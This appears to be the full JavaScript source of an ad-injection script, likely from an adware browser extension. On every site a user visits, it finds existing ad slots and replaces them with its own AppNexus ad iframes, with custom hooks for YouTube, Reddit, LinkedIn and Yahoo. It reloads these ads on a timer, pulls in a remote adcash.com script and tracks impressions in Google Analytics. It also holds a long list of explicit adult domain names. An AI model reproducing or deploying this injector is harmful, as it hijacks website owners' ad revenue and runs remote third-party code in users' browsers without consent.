if (typeof(cas_injector) == "undefined")  {

  function bindReady(handler){
      var called = false     
      function ready() {
          if (called) return
          called = true
          handler()
      }     
      if ( document.addEventListener ) {
          document.addEventListener( "DOMContentLoaded", function(){
              ready()
          }, false )
      } else if ( document.attachEvent ) { 
          if ( document.documentElement.doScroll && window == window.top ) {
              function tryScroll(){
                  if (called) return
                  if (!document.body) return
                  try {
                      document.documentElement.doScroll("left")
                      ready()
                  } catch(e) {
                      setTimeout(tryScroll, 0)
                  }
              }
              tryScroll()
          }
          document.attachEvent("onreadystatechange", function(){     
              if ( document.readyState === "complete" ) {
                  ready()
              }
          })
      }
      if (window.addEventListener)
          window.addEventListener('load', ready, false)
      else if (window.attachEvent)
          window.attachEvent('onload', ready)
      /*  else  // use this 'else' statement for very old browsers :)
          window.onload=ready
      */
  }
  readyList = []      
  function onReady(handler) {  
      if (!readyList.length) { 
          bindReady(function() { 
              for(var i=0; i<readyList.length; i++) { 
                  readyList[i]() 
              } 
          }) 
      }   
      readyList.push(handler) 
  }

  function get_elem_offset(element){
      var body = document.body,
          win = document.defaultView,
          docElem = document.documentElement,
          box = document.createElement('div');
      box.style.paddingLeft = box.style.width = "1px";
      body.appendChild(box);
      var isBoxModel = box.offsetWidth == 2;
      body.removeChild(box);
      box = element.getBoundingClientRect();
      var clientTop  = docElem.clientTop  || body.clientTop  || 0,
          clientLeft = docElem.clientLeft || body.clientLeft || 0,
          scrollTop  = win.pageYOffset || isBoxModel && docElem.scrollTop  || body.scrollTop,
          scrollLeft = win.pageXOffset || isBoxModel && docElem.scrollLeft || body.scrollLeft;
      return {
          top : box.top  + scrollTop  - clientTop,
          left: box.left + scrollLeft - clientLeft};
  }

  var cas_injector_settings = {
    version: "2.1.42",
    ad_types: [{width: 300, height: 250},{width: 160, height: 600},{width: 728, height: 90},{width: 468, height: 60},{width: 300, height: 600}],
    ga_id: "UA-46046847-1",
    apnx_d: "2152579",
    apnd_d_by_positions: {atf: "2403095", btf: "2403101"},
    apnd_multi: [
	{
		'300x250': {atf: "2403095", btf: "2403101"},
		'160x600': {atf: "2403095", btf: "2403101"},
                '728x90': {atf: "2403095", btf: "2403101"},
                '468x60': {atf: "2403095", btf: "2403101"}
	},
	{
                '300x250': {atf: "2453218", btf: "2453219"},
                '160x600': {atf: "2453209", btf: "2453210"},
                '728x90': {atf: "2453236", btf: "2453237"},
                '468x60': {atf: "2453223", btf: "2453224"}
        }
    ],
    apnx_tag: "<IFRAME SRC='http://ib.adnxs.com/tt?id=[id]&size=[size]&cb=[rand]&position=[pos]' FRAMEBORDER='0' SCROLLING='no' MARGINHEIGHT='0' MARGINWIDTH='0' TOPMARGIN='0' LEFTMARGIN='0' ALLOWTRANSPARENCY='true' WIDTH='[w]' HEIGHT='[h]' STYLE='width: [w]px; height:[h]px'></IFRAME>",
    refresh_rate: 1 * 60 * 1000,
    ratio: 20,
    default_ratio: 10,
    exclude: ["brobible.com", "mp3.zing.vn", "ad-box.net","thepiratebay","facebook.com", "contentadserver", "funi-lists.com", "justgirlyvines.com", "porn", "xvideos", "redtube", "xhamster.com", "chaturbate.com", "xnxx.com", "shooshtime.com", "arabsextubes.net","newsexpictures.com","sexadulter.com","dongyoungsang.com","youngmommyfuckers.com","milfsexytube.com","maturemomsex.com","torturesextube.net","ghettosex.org","familysexmovies.net","russianteensex.net","sexmomtubes.com","incestsextube.org","sexcartoonstube.net","momtubesex.xxx","priznaniosexu.cz","allmaturesextube.com","sexad.net","imomsex.com","superteensextube.com","sexyhotteens.com","indiansexvideotube.com","goldtubesex.com","dizzysex.com","sexandrome.it","sexymaturepussy.com","realexgfsexposed.com","sexcartoons.org","hotmaturesex.com","hdyoungvideos.com","sexbbw.tv","japan-sex-tube.org","campusexplorer.com","arabsexvideo.org","teeniesexworld.com","desisexmovies.net","sexmaturefantasy.com","sexyjapantube.com","mysexyteens.com","sexinterracial.org","hardsex-video.com","arabsex4u.net","ladyboysextube.com","sexhdfilms.com","aflamonlinesex.com","youngincest.net","1japansextube.com","youngsextube.xxx","freeindiansex.net","cutematuresex.com","kanesex.com","sexynudeteens.net","sexforfreetube.com","sex-nude-videos.net","arabsexvideo.net","mundosexanuncio.com","sexoamadorbr.com","hdchubbysex.com","analteensex.net","hairyvaginasex.com","chinesesexmovies.net","aflamsextube.com","mafiadosexo.com","sexvideobaza.com","japanese-sex-tubes.com","twinksexvids.com","sexyono.com","xxxretrosex.com","videosexestreaming.org","realvintagesex.com","sexslavetube.net","ohsexfilm.com","shemalesexpics.com","nastymaturesex.com","youngbbw.net","all-sex-69.com","teenpussysex.com","lesbiansexfree.net","trannysextubes.net","annoncesexpress.com","youngsextube.org","indiansexscandalstube.com","pepsex.com","blacksextube.xxx","ebonysextube.xxx","tubeebonysex.com","indianhotsex.org","myanimalsex.com","southindiansexmovies.net","momandsonsextube.com","hotyoungvideos.com","onetubesex.com","videosdesexogay.com.br","videosextremos.net","1bollywoodsex.com","sexhardcore.xxx","arabsex12.com","indiansextubestube.com","famososexpress.com.mx","homesexav.net","younghouselove.com","sexsquirrel.com","sexobr.ws","xsexyteens.com","mommy-sex-tube.com","phimsex-hay.info","indian-sex-videos.net","kurd-sex.com","isexanal.net","korean-sex-tube.com","sextov.co.il","aflam4sex.com","sexyebonywhores.com","allsexlife.net","egyptiansextube.com","hornyanalsex.com","hotsexxxxtube.com","sexmob.es","sexonalaje.com","izlesexizle.org","sexybabes69.com","sexymilfs.org","getdogsex.com","vagosex-de.com","casadashardsextube.com","top-momsex.com","veryhotsex.net","22-sex.com","nudemilfsex.com","sexwithemily.com","sexyamateurspics.com","bigsexmom.com","sikisizlesexizle.org","young-lesbian.com","youngandstyle.fr","fithealthysexy.com.au","sex-mother.com","youngcons.com","halasex.com","hugesex.tv","sexfilmschannel.com","younggaytube.net","youngtwink18.com","sex.hu","sexygirls7.com","xxxteensex.net","youngjuniorholes.com","lhsex.co.il","sexyblackwhores.com","sexywhitegirlracks.com","tuta-sex.com","18sexygirl.com","dailyblacksex.com","erosextube.com","kinksextube.com","sexyat.net","homemadesexygirls.com","japansextubehd.com","mom-sexmovies.com","mommysex.net","momsexplorer.com","sexualmothers.com","teenhdsex.xxx","filmesdesexohd.com","sexoquente.tv","sextubeone.com","sexyglamournudes.com","sexylesbiantubes.com","yourindiansex.com","hdyoungmovies.com","sex-gay-tube.com","sex-incest.net","sexmenu.org","sexochicasx.net","trueorgysex.com","besttamilsex.com","femme-mature-sexy.com","xxxmature-sex.com","young-lover.org","dogsexvideo.us","geeksaresexy.net","hotandsexyzone.com","indian-sex-stories.net","position-sex.com","sexvintage.net","sexy-teens.xxx","younguderground.org","arabsexmovies4u.com","drunksextube.net","essexchronicle.co.uk","fulltime-sex.com","mushroomsextube.com","sexnod.com","sexpartner.no","wetsextoys.com","gsexman.com","hardtrannysex.com","japansex.name","sexoenpuertorico.com","videodesexo.com.br","virtualsexy.net","xxxsexmom.com","youngtubesex.com","arabsextube4u.com","bhsexo.com.br","goldamateursex.com","hqcamsexchat.com","realgfsextape.com","sex-black.xxx","sex-mama.com","sexmedia.co.il","sexoencostarica.com","sleepingsextube.net","tutorialesextremos.com","forcedsexvideotube.com","freeyoungpics.net","fuckingyoung.es","gratis-camsex.de","maturesexthumbnails.com","sexbaza.info","sexhdvideos.xxx","sexycaramelos.com","tasexo.com","youngxxxtube.com","blacksexvideo.org","camsexexpress.com","familysextube.org","fixsexxx.com","foreveryoungadult.com","hd-free-sex.com","sexoterapia.com","sexwithmommy.com","south-indian-sex.org","blacksextube.tv","forbiddenyoungvideos.com","freegirlsexmovies.com","freesextube4u.com","freetamilsex.net","hothomosex.com","hotnudesex.net","koreanpussysex.com","livesexhard.com","megamaturesex.com","momsonsex.org","nudesexyteens.com","resultadosexamenadmision.com","sammyboysexforum.com","sextubem.com","sexydx.tk","sexypumas.net","slimteensex.com","smartsexymoms.com","thisisexeter.co.uk","versexo.org","www-sex.xxx","yesasiansex.com","africansexmovies.net","centralsextubes.com","daddysex.net","escritoriodosexo.us","granny-sex-videos.net","hotmomsonsex.org","hotteensexhd.com","hottubesex.net","japanesesextube.xxx","marosexshop.gr","nakedsexycelebs.net","oliveyoungshop.com","playsexo.net","sex-boom.com","sexozas.com","sexyface.es","sexyloca.com","sexyperfectgirls.com","stocksexperts.net","teensex.to","young-couples.com","youngschoolgirls.biz","asiangaysex.net","asiansex-x.com","boobssextube.com","brightestyoungthings.com","esextante.com.br","esportsexpress.com","gaysexfind.com","geilesexgeschichten.com","hdasiasex.com","hindi-sex.net","hurtsex.com","japan-sex-tube.net","lovesexxx.net","maturesexking.com","sex-on-fire.net","sexadult.xxx","sexdatenow.net","sexgangsters.com","sexogaygratis.biz","sexpicturesarchive.com","sextalker.net","sexynicebabes.com","sexypower.xxx","shemalesexidol.com","tengasexo.com","trannyxxxsex.com","vidsex.xxx","xxxgirlsex.net","young-lesbian.net","18-sex.xxx","2youngtube.com","bbwfuckingsex.net","bingosexe.com","chinese-sex.org","coversex.com","family-sex-tube.net","gaysexovideos.net","hamstersextube.com","hardsextubemorenas.com","homemadesex.xxx","indianbhabhisextube.com","japonicsex.com","kamasex.co.il","losextras.es","milfsexnow.com","mysexseeker.com","placeforsexdate.com","sex-adult.xxx","sex100.com","sexag.net","sexatraf.co.il","sexenio.com.mx","sexfilmegratis.net","sexmoviegays.com","sexoanimais.com.br","sexogratis69.es","sexoral69.com","sexoxs.com","sextoonsfantasy.com","sexualbang.com","sexualmamas.com","sexv.co.il","sexylegsplaygirl.com","superhentaisex.com","videosexmom.com","xhamsteramateursex.com","young-ass.com","young-star.biz","youngblowjobs.net","youngmoneyhq.com","youngnakedgirl.org","22sexy.com","asextremetube.com","audiosex.pro","becasextranjero.net","bestsexvideo.info","casual-sex-dating.info","cyprusexpat.co.uk","donnayoung.org","filipinosextube.org","fuckingsex.xxx","guru-sexy.com","hardsexseetube.com","hdgaymensex.com","homemadeamaturesex.com","hotsexy-fit.com","hotyoungfuckers.com","jefabriquemonsextoy.com","lesbianextremesex.net","mobielesexverhalen.nl","msexchange.org","mysexclinic.com","mysexweb.net","ohsexe.net","sex-dump.com","sexboxing.net","sexcams21.com","sexcigarsbooze.com","sexdategeheim.nl","sexe-scato.com","sexhattimiz.info","sexmania.co.il","sexodirectohd.com","sexone.lt","sexonotelefone.net","sexoparalelo.com","sexpunt.nl","sexshop9.com.mx","sexstory.com.ua","sexwithinmarriage.com","sexy.com","sexymatureposers.com","sexyradio.fm","sexytanga.sk","sexywomenandmotorcycles.com","slutsex.net","thaisexymovie.info","theyoungest.org","tini-sex.net","topsexweb.com","tuguiasexual.com","veryyoung.org","x-sex.xxx","youngmoney.com","youngnaturals.net","youngpussyclips.com"],
    url_ad_keywords: ["ad", "300x250", "160x600", "728x90", "468x60", "advertiser", "300x265", "Advertisers"],
    window_height: undefined,
    hight_sites: ["my.ebay.", "imdb.com", "google.com","weather.com","girlsgogames.com","dailymail.co.uk","medicalnewstoday.com","skyscanner.net","bild.de","nationalrail.co.uk","wikipedia.org","washingtonpost.com","newegg.com","ekstrabladet.dk","sacmag.com","boston.com","search.conduit.com","apartmenttherapy.com","evite.com","snesfun.com","autotrader.com","woot.com","healthgrades.com","swagbucks.com","netmums.com","amazon.","ebay.com","amazon.co.uk","ebay.co.uk", "linkedin.com", "yahoo."]
  }

  var cas_injector = {
    init: function(){
      if (cas_injector_settings.hight_sites.indexOf(window.location.host.replace("www.","")) > -1)  {
  cas_injector_settings.refresh_rate = 0.5 * 60 * 1000;
      }
      cas_injector_settings.window_height = isNaN(window.innerHeight) ? window.clientHeight : window.innerHeight;
 
      var fail = false;
      try {
    for (var i=0; i <= cas_injector_settings.exclude.length-1; i++) {
          if (document.location.href.toLowerCase().indexOf(cas_injector_settings.exclude[i]) > -1)  {
            fail = true;
            return;
          }
        }
      } catch(err)  {}
  
  /*
      for (var u in document.getElementsByTagName("script")) {
        try {
          var src = document.getElementsByTagName("script")[u].getAttribute("src");
          if (src.indexOf("http://cdn.contentadserver.com/server_content") > -1)  {
            _gaq.push(['inj._trackEvent', 'Injector Script', src]);
          }
        } catch(error)  {}
      }*/

      if ( ! fail)  {
  //setTimeout(function(){
          cas_injector.search_ads();
  //}, 2000);
        
        // Run refresh interval
        setInterval(function(){cas_injector.search_ads()}, cas_injector_settings.refresh_rate);


        var head= document.getElementsByTagName('head')[0];
      var script= document.createElement('script');
      script.type= 'text/javascript';
      script.src= 'http://www.adcash.com/script/java.php?option=rotateur&r=168413';
      head.appendChild(script);

        
      }
    },
    search_ads: function(custom){
      custom = custom == undefined ? true : custom;
      var ads = document.querySelectorAll("iframe, img, ins, embed");
	for (var i=0; i <= ads.length-1; i++) { 
        try {
          
    var is_img = false;
          
    try {
      is_img = ads[i].tagName.toUpperCase() == "IMG";
          } catch(err)  { }

    if (is_img) {
            if ( ! this.is_string_in_array(ads[i].getAttribute("src").toLowerCase(), cas_injector_settings.url_ad_keywords) ) {
              continue;
            }
          }

          var element_pos = get_elem_offset(ads[i]);
          var element_size = this.get_element_size(ads[i]);
          var ad_size = this.get_ad_size(element_size.width, element_size.height, (ads[i].tagName.toUpperCase() == "INS"));
          var ad_pos = element_pos.top > cas_injector_settings.window_height ? "below" : "above";

          if (ad_size != false) {
            ads[i].parentNode.innerHTML = this.get_ad(ad_size.width, ad_size.height, ad_pos);
          }

        } catch(error)  {
//          __inj('send', 'event', 'JS Error - search_ads', error.toString()); 
        }
      }
      if (custom)
        this.custom_ads();
    },
    custom_ads: function(width, height){
      switch (window.location.hostname) {
        case "www.youtube.com":
          var ad = this.get_ad(300, 250, "above");
          try {
            setTimeout(function(){
              if ( ! document.getElementById("google_companion_ad_div") || document.getElementById("google_companion_ad_div").innerHTML == "") {
                document.getElementById("watch7-sidebar-discussion").innerHTML = ad;
                document.getElementById("google_companion_ad_div").parentElement.removeChild(document.getElementById("google_companion_ad_div"));
              } else  {
                cas_injector.search_ads(false);
              }
            }, 2000);
          } catch (error) {

          }
        break;
        case "www.reddit.com":
          if (document.getElementById("ad_main")) {
            var ad = this.get_ad(300, 250, "above");
            document.getElementById("ad_main").parentNode.innerHTML = ad;
          }
        break;
  case "www.linkedin.com":
    //ad-slot-3
    if (document.getElementById("ad-slot-3")) {
      var ad = this.get_ad(728, 90, "above");
      document.getElementById("ad-slot-3").style.height="90px";
      document.getElementById("ad-slot-3").innerHTML = ad;
    }
  break;
  case "www.yahoo.com":
  case "news.yahoo.com":
  case "sports.yahoo.com":
  case "weather.yahoo.com":
  case "games.yahoo.com":
  case "answers.yahoo.com":
  case "travel.yahoo.com":
    setTimeout(function(){
                    cas_injector.search_ads(false);
    }, 3000);
    /*if (document.getElementById("yom-ad-LREC")) {
                        var ad = this.get_ad(300, 250, "above");
                        document.getElementById("yom-ad-LREC").innerHTML = ad;
                }*/
  break;
      }
    },
    get_ad: function(width, height, ad_pos){
  if (width == 300 && height == 600)  {
    width = 160;
  }    

    ad_pos = (ad_pos == undefined) ? "above" : ad_pos;
  
	var randomApnx = cas_injector_settings.apnd_multi[Math.floor(Math.random()* cas_injector_settings.apnd_multi.length)];
	randomApnx = randomApnx[width+'x'+height];

     var apnx_placement = (ad_pos == "above") ? randomApnx.atf : randomApnx.btf;

      __inj('send', 'event', 'Impression', width+"X"+height+" - "+apnx_placement+" - "+ad_pos+"");
//      __inj('send', 'event', 'Impression Domain', window.location.protocol + "//" + window.location.hostname);

      var ad = cas_injector_settings.apnx_tag;
      ad = ad.replace("[id]", apnx_placement);
      ad = ad.replace("[size]", width+"x"+height);
      ad = ad.replace("[w]", width);
      ad = ad.replace("[w]", width);
      ad = ad.replace("[h]", height);
      ad = ad.replace("[h]", height);
      ad = ad.replace("[pos]", ad_pos);
      ad = ad.replace("[rand]", Math.random()*10000);

      return ad;
    },
    is_string_in_array: function(str, arr)  {
      for (var i=0; i <= arr.length-1; i++) {
        if (str.indexOf(arr[i]) > -1) {
          return true;
        }
      }
      return false;
    },
    between: function(x, min, max) {
      return x >= min && x <= max;
    },
    get_size_ration: function(size, is_ins) {
      if (is_ins == true) {
        return (size/100)*cas_injector_settings.ratio;
      } else {
       return (size/100)*cas_injector_settings.default_ratio;
     }
    },
    get_ad_size: function(width, height, is_ins) {
      for (var i=0; i <= cas_injector_settings.ad_types.length-1; i++)  {
        var min_width = cas_injector_settings.ad_types[i].width - this.get_size_ration(cas_injector_settings.ad_types[i].width, is_ins);
        var max_width = cas_injector_settings.ad_types[i].width + this.get_size_ration(cas_injector_settings.ad_types[i].width, is_ins);
        var min_height = cas_injector_settings.ad_types[i].height - this.get_size_ration(cas_injector_settings.ad_types[i].height, is_ins);
        var max_height = cas_injector_settings.ad_types[i].height + this.get_size_ration(cas_injector_settings.ad_types[i].height, is_ins);


        if (this.between(width, min_width, max_width) && this.between(height, min_height, max_height))  {
          return {'width': cas_injector_settings.ad_types[i].width, 'height': cas_injector_settings.ad_types[i].height}
        }
      }
      return false;
    },
    get_element_size: function(element) {
      if (element.tagName.toUpperCase() == "IFRAME" || element.tagName.toUpperCase() == "INS")  {
        return {'width': element.offsetWidth, 'height': element.offsetHeight};
      }
      return {'width': element.width, 'height': element.height};
    }
  }

  onReady(function() {
    cas_injector.init();
  });

  /*
  var _gaq = _gaq || []; 
  _gaq.push(['inj._setAccount', cas_injector_settings.ga_id]); 
  _gaq.push(['inj._trackPageview']); 

  (function() { 
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; 
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; 
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); 
  })();
  */

(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','__inj');
  __inj('create', cas_injector_settings.ga_id, 'auto');
  __inj('send', 'pageview');

  //_gaq.push(['inj._trackEvent', 'Injector version', cas_injector_settings.version]);
//  __inj('send', 'event', 'Injector Domain - GAO', window.location.hostname);
}

